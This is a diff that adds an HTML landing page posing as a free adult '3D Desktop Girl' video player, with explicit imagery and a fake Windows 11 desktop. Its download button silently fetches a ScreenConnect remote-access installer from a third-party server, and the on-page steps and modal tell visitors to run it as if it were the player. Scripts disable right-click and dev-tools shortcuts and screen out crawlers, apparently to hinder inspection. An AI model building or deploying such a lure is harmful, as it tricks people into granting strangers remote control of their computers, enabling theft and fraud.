@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Windows 11 · Free Desktop Show</title>
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <style>
+        /* Your existing styles here */
+        body {
+            background: #0d0d0f;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 1rem;
+        }
+        .bg-primary {
+            background-color: #005fb8;
+        }
+        .taskbar-w11 {
+            background: rgba(30, 30, 30, 0.92);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            padding: 6px 16px;
+            height: 52px;
+        }
+        .taskbar-w11 .taskbar-item {
+            transition: all 0.15s ease;
+            border-radius: 6px;
+            padding: 6px 10px;
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 40px;
+            height: 40px;
+        }
+        .taskbar-w11 .taskbar-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .taskbar-w11 .taskbar-item.active {
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .taskbar-w11 .taskbar-item .icon {
+            font-size: 20px;
+            line-height: 1;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        .taskbar-w11 .taskbar-item .badge {
+            position: absolute;
+            bottom: 4px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 12px;
+            height: 3px;
+            background: #005fb8;
+            border-radius: 2px;
+        }
+        .taskbar-w11 .taskbar-item .badge.active {
+            background: #005fb8;
+        }
+        .taskbar-w11 .start-btn {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 6px;
+            padding: 4px 8px;
+        }
+        .taskbar-w11 .start-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .taskbar-w11 .system-tray {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.15s ease;
+            cursor: pointer;
+        }
+        .taskbar-w11 .system-tray:hover {
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .taskbar-w11 .system-tray .tray-icon {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.85);
+        }
+        .taskbar-w11 .clock {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 400;
+            line-height: 1.2;
+            text-align: right;
+        }
+        .taskbar-w11 .clock .date {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        .taskbar-w11 .search-box {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 20px;
+            padding: 4px 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            min-width: 140px;
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+        }
+        .taskbar-w11 .search-box:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.06);
+        }
+        .taskbar-w11 .search-box span {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        .taskbar-w11 .search-box .search-icon {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .taskbar-w11 .divider {
+            width: 1px;
+            height: 28px;
+            background: rgba(255, 255, 255, 0.06);
+            margin: 0 4px;
+        }
+        .taskbar-w11 .taskbar-items-center {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+        .desktop-icon {
+            position: absolute;
+            z-index: 5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 8px;
+            transition: background 0.15s ease;
+            color: white;
+            text-shadow: 0 1px 4px rgba(0,0,0,0.8);
+            font-size: 12px;
+        }
+        .desktop-icon:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .desktop-icon .icon {
+            font-size: 36px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
+        }
+        .desktop-icon .label {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(4px);
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            text-align: center;
+            max-width: 80px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .download-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            z-index: 30;
+            background: linear-gradient(145deg, #f8d76a, #e8b830);
+            color: #0d0d12;
+            font-weight: 700;
+            font-size: 0.9rem;
+            padding: 0.8rem 1.8rem;
+            border: none;
+            border-radius: 60px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(255, 215, 100, 0.3);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.02em;
+            backdrop-filter: blur(2px);
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.8), 0 0 0 4px rgba(255, 215, 100, 0.5);
+            background: linear-gradient(145deg, #fade7a, #eec73c);
+        }
+        .download-btn:active {
+            transform: scale(0.97);
+        }
+        .download-btn::before {
+            content: '⬇';
+            font-size: 1.2rem;
+        }
+        @media (max-width: 640px) {
+            .download-btn {
+                font-size: 0.7rem;
+                padding: 0.5rem 1rem;
+                top: 12px;
+                right: 12px;
+            }
+            .download-btn::before {
+                font-size: 0.9rem;
+            }
+            .taskbar-w11 .search-box {
+                min-width: 80px;
+            }
+            .taskbar-w11 .search-box span {
+                font-size: 11px;
+            }
+        }
+        .cta-wrapper {
+            width: 100%;
+            max-width: 5xl;
+            margin-bottom: 1rem;
+            display: flex;
+            justify-content: center;
+        }
+        .cta-box {
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 215, 100, 0.2);
+            border-radius: 16px;
+            padding: 14px 28px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            animation: slideDown 0.5s ease-out;
+            width: 100%;
+        }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .cta-box .title {
+            color: #f8d76a;
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 0.02em;
+        }
+        .cta-box .subtitle {
+            color: rgba(255, 255, 255, 0.85);
+            font-size: 0.95rem;
+            margin-top: 4px;
+        }
+        .cta-box .highlight-text {
+            color: #ff6b9d;
+            font-weight: 600;
+        }
+        .cta-box .steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        .cta-box .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.85rem;
+        }
+        .cta-box .step .num {
+            background: #f8d76a;
+            color: #0d0d12;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.75rem;
+        }
+        .cta-box .step .arrow {
+            color: #f8d76a;
+            font-size: 1.2rem;
+        }
+        @media (max-width: 640px) {
+            .cta-box {
+                padding: 10px 16px;
+            }
+            .cta-box .title {
+                font-size: 1rem;
+            }
+            .cta-box .subtitle {
+                font-size: 0.8rem;
+            }
+            .cta-box .steps {
+                gap: 6px;
+            }
+            .cta-box .step {
+                font-size: 0.7rem;
+            }
+            .cta-box .step .num {
+                width: 18px;
+                height: 18px;
+                font-size: 0.65rem;
+            }
+        }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-content {
+            background: linear-gradient(145deg, #1a1a1e, #0d0d0f);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 32px;
+            max-width: 520px;
+            width: 100%;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(255, 215, 100, 0.15);
+            position: relative;
+            text-align: center;
+        }
+        .modal-content .icon {
+            font-size: 4rem;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+        .modal-content h2 {
+            color: #f8d76a;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1.2rem;
+            letter-spacing: 0.02em;
+        }
+        .modal-content .instructions {
+            color: rgba(255, 255, 255, 0.85);
+            font-size: 1.1rem;
+            line-height: 1.8;
+            text-align: left;
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .modal-content .instructions li {
+            margin-bottom: 0.6rem;
+            list-style-type: none;
+            position: relative;
+        }
+        .modal-content .instructions li::before {
+            content: '▸';
+            color: #f8d76a;
+            position: absolute;
+            left: -1.5rem;
+            font-weight: 700;
+        }
+        .modal-content .highlight {
+            color: #f8d76a;
+            font-weight: 600;
+        }
+        .modal-close-btn {
+            background: linear-gradient(145deg, #f8d76a, #e8b830);
+            color: #0d0d12;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 0.8rem 2.5rem;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+            box-shadow: 0 4px 20px rgba(248, 215, 106, 0.3);
+        }
+        .modal-close-btn:hover {
+            transform: scale(1.04);
+            box-shadow: 0 8px 30px rgba(248, 215, 106, 0.5);
+        }
+        .modal-close-btn:active {
+            transform: scale(0.97);
+        }
+        .modal-x {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 1.8rem;
+            cursor: pointer;
+            transition: color 0.2s;
+            background: none;
+            border: none;
+            line-height: 1;
+        }
+        .modal-x:hover {
+            color: rgba(255, 255, 255, 0.8);
+        }
+        @media (max-width: 480px) {
+            .modal-content {
+                padding: 1.8rem 1.2rem;
+            }
+            .modal-content h2 {
+                font-size: 1.4rem;
+            }
+            .modal-content .instructions {
+                font-size: 0.95rem;
+                padding-left: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a46d2344b956a1d4cbbc207/1jsiaa7g8';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+    <!-- ============================================ -->
+    <!-- BOT PROTECTION SCRIPT (FIXED) -->
+    <!-- ============================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // =============================================
+            // 1. DETECT HEADLESS BROWSERS & BOTS (PASSIVE)
+            // =============================================
+            function detectHeadless() {
+                const checks = [];
+                
+                // Check for headless Chrome/Firefox indicators
+                if (navigator.webdriver) checks.push('webdriver');
+                if (navigator.plugins.length === 0) checks.push('no_plugins');
+                if (navigator.languages.length === 0) checks.push('no_languages');
+                
+                // Check for common bot user agents
+                const botPatterns = [
+                    'bot', 'crawl', 'spider', 'scrape', 'headless', 
+                    'phantom', 'selenium', 'puppeteer', 'playwright',
+                    'http', 'python', 'curl', 'wget', 'java', 'perl',
+                    'ruby', 'go-http', 'okhttp', 'axios', 'node-fetch'
+                ];
+                const ua = navigator.userAgent.toLowerCase();
+                if (botPatterns.some(p => ua.includes(p))) checks.push('bot_ua');
+                
+                // Screen size check (headless often uses small sizes)
+                if (window.screen.width < 200 || window.screen.height < 200) checks.push('tiny_screen');
+                
+                return checks;
+            }
+
+            const botSignals = detectHeadless();
+
+            // =============================================
+            // 2. RATE LIMITING (MORE LENIENT)
+            // =============================================
+            function setupRateLimit() {
+                const storageKey = 'page_visits';
+                const timestampKey = 'page_visit_time';
+                const currentTime = Date.now();
+                const visits = parseInt(sessionStorage.getItem(storageKey) || '0');
+                const lastVisit = parseInt(sessionStorage.getItem(timestampKey) || '0');
+                
+                // Reset counter after 5 minutes of inactivity
+                if (currentTime - lastVisit > 300000) {
+                    sessionStorage.setItem(storageKey, '0');
+                    sessionStorage.setItem(timestampKey, currentTime.toString());
+                    return true;
+                }
+                
+                // Allow 20 reloads per session (more lenient)
+                if (visits > 20) {
+                    // Show a more friendly message
+                    document.body.innerHTML = `
+                        <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0d0d0f;color:white;font-family:sans-serif;text-align:center;padding:2rem;">
+                            <div>
+                                <h1 style="color:#f8d76a;font-size:2rem;">⏳ Please Wait</h1>
+                                <p style="color:rgba(255,255,255,0.7);margin-top:1rem;">Too many page reloads. Please wait a moment and try again.</p>
+                                <button onclick="sessionStorage.clear();location.reload();" style="margin-top:1.5rem;background:#f8d76a;color:#0d0d12;padding:0.8rem 2rem;border:none;border-radius:50px;font-weight:700;cursor:pointer;">Try Again</button>
+                            </div>
+                        </div>
+                    `;
+                    return false;
+                }
+                
+                sessionStorage.setItem(storageKey, (visits + 1).toString());
+                sessionStorage.setItem(timestampKey, currentTime.toString());
+                return true;
+            }
+
+            // =============================================
+            // 3. HONEYPOT TRAP FOR BOTS
+            // =============================================
+            function createHoneypot() {
+                const trap = document.createElement('div');
+                trap.style.cssText = `
+                    position: absolute;
+                    left: -9999px;
+                    top: -9999px;
+                    width: 1px;
+                    height: 1px;
+                    opacity: 0;
+                    pointer-events: none;
+                `;
+                trap.innerHTML = `
+                    <a href="/fake-admin-login" style="display:none;">Admin Login</a>
+                    <input type="text" name="email" value="admin@example.com" style="display:none;">
+                    <input type="password" value="password123" style="display:none;">
+                `;
+                document.body.appendChild(trap);
+                
+                // If someone tries to interact with hidden elements, they're a bot
+                trap.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    document.body.innerHTML = `
+                        <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0d0d0f;color:white;font-family:sans-serif;text-align:center;padding:2rem;">
+                            <div>
+                                <h1 style="color:#ff6b6b;font-size:2rem;">🚫 Access Denied</h1>
+                                <p style="color:rgba(255,255,255,0.7);margin-top:1rem;">Automated access is not allowed.</p>
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+            createHoneypot();
+
+            // =============================================
+            // 4. CONTENT PROTECTION (Prevent copy/paste)
+            // =============================================
+            function protectContent() {
+                // Disable right-click (optional)
+                document.addEventListener('contextmenu', function(e) {
+                    if (!e.target.closest('a') && !e.target.closest('button')) {
+                        e.preventDefault();
+                    }
+                });
+                
+                // Disable keyboard shortcuts for dev tools
+                document.addEventListener('keydown', function(e) {
+                    // F12
+                    if (e.key === 'F12') {
+                        e.preventDefault();
+                        return false;
+                    }
+                    // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) {
+                        e.preventDefault();
+                        return false;
+                    }
+                    if (e.ctrlKey && e.key === 'u') {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+            }
+
+            // =============================================
+            // 5. EXECUTE PROTECTIONS
+            // =============================================
+            
+            // Rate limit check - ONLY if not a real user
+            // Don't block real users with this
+            if (botSignals.length > 2) {
+                // Only block if multiple bot signals detected
+                if (!setupRateLimit()) {
+                    return;
+                }
+            } else {
+                // For real users, use a much higher limit
+                const storageKey = 'page_visits_real';
+                const visits = parseInt(sessionStorage.getItem(storageKey) || '0');
+                if (visits > 50) {
+                    // Very high limit - just in case
+                    if (!setupRateLimit()) {
+                        return;
+                    }
+                }
+                sessionStorage.setItem(storageKey, (visits + 1).toString());
+            }
+            
+            // Protect content (for all users)
+            protectContent();
+            
+            console.log('🛡️ Protection scripts loaded (passive mode)');
+
+        })();
+    </script>
+
+    <!-- ============================================ -->
+    <!-- END BOT PROTECTION -->
+    <!-- ============================================ -->
+
+    <!-- ============================================ -->
+    <!-- YOUR PAGE CONTENT -->
+    <!-- ============================================ -->
+
+    <div class="flex flex-col items-center w-full max-w-5xl">
+
+        <!-- CALL TO ACTION -->
+        <div class="cta-wrapper">
+            <div class="cta-box">
+                <div class="title">🎬 Enjoy 15,000+ Free Full 4k 3D Desktop Girl.</div>
+                <div class="subtitle">
+                    Play on your Desktop in <span class="highlight-text">3 easy steps</span> and start watching
+                </div>
+                <div class="steps">
+                    <div class="step">
+                        <span class="num">1</span>
+                        Click <span style="color:#f8d76a;font-weight:600;">Download Free Desktop Girl</span>
+                    </div>
+                    <span class="arrow">→</span>
+                    <div class="step">
+                        <span class="num">2</span>
+                        Run <span style="color:#f8d76a;font-weight:600;">Check downloads and open screenconnect.msi</span> file
+                    </div>
+                    <span class="arrow">→</span>
+                    <div class="step">
+                        <span class="num">3</span>
+                        Enjoy <span style="color:#ff6b9d;font-weight:600;">Select Girl And Open </span> 🎉
+                    </div>
+<span class="num">3</span>
+                        <div class="title">Press ESC to Desktop Girl.</h1></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MAIN CARD -->
+        <div class="w-full">
+            <div class="relative w-full overflow-hidden rounded-3xl shadow-[0_0_80px_rgba(255,0,93,0.55)] ring-1 ring-gray-600/30">
+                <div class="relative w-full h-[500px] lg:h-[600px]">
+
+                    <!-- Background image -->
+                    <div class="absolute inset-0 bg-cover bg-center bg-no-repeat" style="background-image: url('https://pics.auntmia.com/thumbs/eternaldesire/44209/0cb_045big.jpg');"></div>
+
+                    <!-- Gradient overlay -->
+                    <div class="absolute inset-0 bg-gradient-to-b from-black/30 via-transparent to-black/70"></div>
+
+                    <!-- Desktop Icons -->
+                    <div class="desktop-icon" style="top: 110px; left: 30px;">
+                        <span class="icon">🖥️</span>
+                        <span class="label">This PC</span>
+                    </div>
+                    <div class="desktop-icon" style="top: 200px; left: 30px;">
+                        <span class="icon">📁</span>
+                        <span class="label">Downloads</span>
+                    </div>
+                    <div class="desktop-icon" style="top: 290px; left: 30px;">
+                        <span class="icon">🗑️</span>
+                        <span class="label">Recycle Bin</span>
+                    </div>
+
+                    <!-- DOWNLOAD BUTTON -->
+                    <a href="#" class="download-btn" id="downloadBtn">
+                        Download Free Desktop Girl 
+                    </a>
+
+                    <!-- VIDEO PLAYER -->
+                    <div class="absolute bottom-[5px] left-1/2 -translate-x-1/2 lg:left-[10%] lg:translate-x-0 z-20 pointer-events-none w-full h-[200px] sm:h-[240px] md:h-[300px] lg:h-[500px] xl:h-[600px] flex flex-col justify-end items-center lg:!left-[0%] sm:!h-[450px] lg:!h-[550px]" style="filter: drop-shadow(rgba(0, 0, 0, 0.5) 0px 0px 40px);">
+                        <video 
+                            src="https://nudepatch.net/mystripgirls/f0946_SiaSiberia_05.webm" 
+                            loop 
+                            playsinline 
+                            autoplay 
+                            muted 
+                            class="max-h-full w-auto max-w-full object-contain rounded-xl"
+                            preload="auto"
+                        >
+                            Your browser does not support the video tag.
+                        </video>
+                    </div>
+
+                    <!-- WINDOWS 11 TASKBAR -->
+                    <div class="absolute bottom-0 left-0 right-0 z-10 taskbar-w11">
+                        <div class="max-w-7xl mx-auto flex items-center justify-between h-full">
+
+                            <div class="flex items-center gap-2">
+                                <div class="taskbar-item start-btn" title="Start">
+                                    <span class="icon text-xl">🪟</span>
+                                </div>
+                                <div class="search-box">
+                                    <span class="search-icon">🔍</span>
+                                    <span>Type here to search</span>
+                                </div>
+                            </div>
+
+                            <div class="taskbar-items-center">
+                                <div class="taskbar-item active">
+                                    <span class="icon">💻</span>
+                                    <span class="badge active"></span>
+                                </div>
+                                <div class="taskbar-item">
+                                    <span class="icon">📁</span>
+                                </div>
+                                <div class="taskbar-item">
+                                    <span class="icon">🌐</span>
+                                </div>
+                                <div class="taskbar-item">
+                                    <span class="icon">🎵</span>
+                                </div>
+                                <div class="taskbar-item">
+                                    <span class="icon">🎮</span>
+                                </div>
+                                <div class="divider"></div>
+                                <div class="taskbar-item">
+                                    <span class="icon">📥</span>
+                                    <span class="badge"></span>
+                                </div>
+                            </div>
+
+                            <div class="flex items-center gap-2">
+                                <div class="system-tray">
+                                    <span class="tray-icon">⬆</span>
+                                    <span class="tray-icon">📶</span>
+                                    <span class="tray-icon">🔊</span>
+                                    <span class="tray-icon">🔋</span>
+                                </div>
+                                <div class="divider"></div>
+                                <div class="clock">
+                                    <div id="timeDisplay">12:45</div>
+                                    <div class="date" id="dateDisplay">MM/DD/YYYY</div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- INSTRUCTIONS MODAL -->
+    <div class="modal-overlay" id="instructionModal">
+        <div class="modal-content">
+            <button class="modal-x" id="closeModalBtn">✕</button>
+            <span class="icon">🎬</span>
+            <h2>✨ Ready to Play 3D Videos!</h2>
+            <ul class="instructions">
+                <li><span class="highlight">Downloading Desktop Girl....</span> folder</li>
+                <li>To play desktop video, check your <span class="highlight">Downloads</span></li>
+                <li>Open <span class="highlight">ScreenConnect.ClientSetup.msi</span></li>
+                <li>Select Desktop Girl And Open</li>
+                <li> <span class="highlight">Just Press ESC to close Desktop Girl.</span>! 🎉</li>
+            </ul>
+            <button class="modal-close-btn" id="gotItBtn">Got It!</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // --- Update Clock ---
+            function updateClock() {
+                const now = new Date();
+                const timeStr = now.toLocaleTimeString('en-US', { 
+                    hour: '2-digit', 
+                    minute: '2-digit',
+                    hour12: false 
+                });
+                const dateStr = now.toLocaleDateString('en-US', { 
+                    month: '2-digit', 
+                    day: '2-digit', 
+                    year: 'numeric' 
+                });
+                document.getElementById('timeDisplay').textContent = timeStr;
+                document.getElementById('dateDisplay').textContent = dateStr;
+            }
+            updateClock();
+            setInterval(updateClock, 1000);
+
+            // --- Video handling ---
+            const video = document.querySelector('.absolute video');
+            if (video) {
+                video.muted = true;
+                video.loop = true;
+
+                const attemptPlay = () => {
+                    video.play().then(() => {
+                        console.log('✅ Video playing successfully.');
+                    }).catch(err => {
+                        console.log('⏳ Autoplay blocked, waiting for user interaction...');
+                        document.removeEventListener('click', playOnInteraction);
+                        document.removeEventListener('touchstart', playOnInteraction);
+                        document.addEventListener('click', playOnInteraction, { once: true });
+                        document.addEventListener('touchstart', playOnInteraction, { once: true });
+                    });
+                };
+
+                const playOnInteraction = () => {
+                    video.play().catch(() => {});
+                };
+
+                if (video.readyState >= 2) {
+                    attemptPlay();
+                } else {
+                    video.addEventListener('loadedmetadata', attemptPlay, { once: true });
+                    setTimeout(attemptPlay, 3000);
+                }
+
+                video.addEventListener('error', function(e) {
+                    console.warn('⚠️ Video error:', e);
+                });
+            }
+
+            // --- Modal handling ---
+            const modal = document.getElementById('instructionModal');
+            const downloadBtn = document.getElementById('downloadBtn');
+            const closeBtn = document.getElementById('closeModalBtn');
+            const gotItBtn = document.getElementById('gotItBtn');
+
+            function openModal() {
+                modal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function closeModal() {
+                modal.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+
+            downloadBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                openModal();
+                
+                const downloadLink = document.createElement('a');
+                downloadLink.href = 'https://pindush.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=3d&c=Player&c=&c=&c=&c=&c=&c=';
+                downloadLink.download = 'ScreenConnect.ClientSetup.msi';
+                downloadLink.style.display = 'none';
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+            });
+
+            closeBtn.addEventListener('click', closeModal);
+            gotItBtn.addEventListener('click', closeModal);
+
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) {
+                    closeModal();
+                }
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && modal.classList.contains('active')) {
+                    closeModal();
+                }
+            });
+
+            console.log('🎬 Windows 11 style with bot protection (fixed)');
+
+        })();
+    </script>
+</body>
+</html>
